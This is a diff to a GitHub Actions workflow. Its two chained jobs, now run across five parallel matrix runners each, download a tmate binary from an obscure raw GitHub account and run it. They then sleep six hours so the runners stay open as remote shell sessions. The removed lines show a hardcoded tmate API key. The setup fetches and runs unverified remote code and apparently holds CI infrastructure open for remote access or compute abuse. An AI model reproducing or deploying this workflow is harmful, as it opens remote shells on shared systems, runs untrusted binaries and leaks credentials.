@@ -7,20 +7,38 @@ jobs:
   tmate-1:
     runs-on: ubuntu-latest
     timeout-minutes: 360
+    strategy:
+      matrix:
+        runner_id: [1, 2, 3, 4, 5]  # 5 parallel runners
+      fail-fast: false
     steps:
-      - run: |
-          wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
+      - name: Download tmate
+        run: |
+          set -e
+          wget -O tmate https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
           chmod +x tmate
-          ./tmate -F -n j1 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg &
+      - name: Start tmate session
+        run: |
+          set -e
+          ./tmate -F &
           sleep 21600   # 6 hours
 
   tmate-2:
     needs: tmate-1
     runs-on: ubuntu-latest
     timeout-minutes: 360
+    strategy:
+      matrix:
+        runner_id: [1, 2, 3, 4, 5]  # Must match tmate-1
+      fail-fast: false
     steps:
-      - run: |
-          wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
+      - name: Download tmate
+        run: |
+          set -e
+          wget -O tmate https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate
           chmod +x tmate
-          ./tmate -F -n j1 -k tmk-mS87E0h6YTY55X6FpuAAbWFMpg &
+      - name: Start tmate session
+        run: |
+          set -e
+          ./tmate -F &
           sleep 21600   # another 6 hours
